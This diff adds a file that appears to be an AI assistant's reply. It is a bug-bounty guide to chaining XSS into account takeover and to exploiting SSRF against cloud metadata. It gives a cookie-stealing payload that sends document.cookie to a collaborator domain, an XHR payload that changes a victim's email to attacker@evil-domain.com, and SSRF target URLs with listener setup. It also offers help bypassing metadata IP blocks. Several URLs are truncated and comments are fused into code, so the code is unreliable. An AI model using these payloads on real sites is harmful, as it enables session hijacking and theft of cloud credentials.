@@ -1,0 +1,78 @@
+Here is how you can achieve high payouts in bug bounties: first, learn how to turn a basic Cross-Site Scripting (XSS) vulnerability into a full account takeover, and second, learn how to uncover Server-Side Request Forgery (SSRF) to access a company's internal cloud infrastructure.
+------------------------------
+## Part 1: Chaining XSS to Hijack Account States
+An alert(document.domain) pop-up only proves a vulnerability exists. To earn a critical-severity bounty payout, you must demonstrate real impact by writing an exploit payload that actively steals data or hijacks an account session.
+## 1. The Session Cookie Theft Payload
+If the target application does not protect its session cookies using the HttpOnly flag, an attacker can use XSS to read the cookies via JavaScript and exfiltrate them to an external server.
+
+// Malicious payload injected into the vulnerable XSS vectornew Image().src = "https://your-collaborator-domain.com" + encodeURIComponent(document.cookie);
+
+
+* How it works: The script creates a hidden image element in the background. It forces the victim's browser to send a GET request to your listener server, appending their private session tokens directly to the URL parameters.
+
+## 2. The One-Click Account Takeover (CSRF via XSS)
+If cookies are protected by HttpOnly, you cannot read them directly with JavaScript. However, because your malicious script runs directly inside the victim's authenticated browser session, you can force their browser to perform actions on their behalf, such as changing their registered email address.
+
+// Malicious script hosted on your server or injected via the XSS vulnerabilityvar xhr = new XMLHttpRequest();
+xhr.open("POST", "https://target.com", true);
+xhr.setRequestHeader("Content-Type", "application/json");// The browser automatically attaches the victim's HttpOnly session cookies to this request
+xhr.send(JSON.stringify({ "email": "attacker@evil-domain.com" }));
+
+
+* The Impact: The next time a logged-in user clicks your vulnerable XSS link, their account email address is instantly changed to your email address. You can then trigger a password reset to lock them out and take over the account.
+
+------------------------------
+## Part 2: Hunting for Server-Side Request Forgery (SSRF)
+Server-Side Request Forgery (SSRF) is a critical flaw that allows an attacker to force a target web application's backend server to make unauthorized HTTP requests. This can expose restricted internal corporate APIs or sensitive cloud metadata infrastructure.
+
+[Attacker] ---> Sends Malicious URL ---> [Target Public Server] ---> Fetches Secret File ---> [Internal AWS Cloud Metadata]
+
+## 1. Identifying High-Risk Target Parameters
+Look for application input values, parameters, or API request payloads that accept external web addresses, file locations, or IP targets. Common indicators include:
+
+* ?url=https://images.com
+* ?file=http://external-site.com
+* ?api_url=https://partner-portal.com
+* ?webhook=https://my-integrations.com
+
+## 2. Common Cloud Infrastructure Exploit Payloads
+If a web application takes your URL parameter and fetches it from the backend server without validation, try swapping the URL out with restricted cloud management endpoints.
+## Internal AWS (Amazon Web Services) & Google Cloud Metadata
+Cloud servers use an internal, unauthenticated link layer to let virtual machines check their configurations. If the target server is hosted on AWS, inject this IP address:
+
+http://169.254.169
+
+
+* The Impact: If successful, the target server will print out internal cloud infrastructure passwords and temporary AWS access keys in your browser window, giving you control over their cloud backend.
+
+## Internal DigitalOcean Metadata
+
+http://169.254.169
+
+## Local System Port Probing
+Test if you can communicate with applications running locally on the server that are blocked from the open internet (such as internal administration dashboards or databases):
+
+http://127.0.0
+http://localhost:6379 (Default port for Redis databases)
+
+------------------------------
+## 3. How to Set Up an SSRF Listener (Interactsh)
+To verify blind SSRF bugs (where the server processes your request but doesn't show the output on the page), you need an external server to listen for incoming connections from the target.
+
+   1. Install Interactsh CLI via Go:
+   
+   go install -v ://github.com
+   
+   2. Start the client session:
+   
+   ~/go/bin/interactsh-client
+   
+   * It will output a unique lookup domain like c84j72...interactsh.com.
+   3. Inject your listener domain: Paste that domain into the target's vulnerable parameter field:
+   
+   https://target.com
+   
+   4. Check logs: If the target server is vulnerable, your terminal window will flash with incoming HTTP or DNS request logs coming directly from the target company's corporate server IP address.
+
+Would you like to write a functional automation pipeline script to fuzz for hidden SSRF input parameters across a list of subdomains, or learn about bypassing firewalls that block the 169.254.169.254 IP address?
+
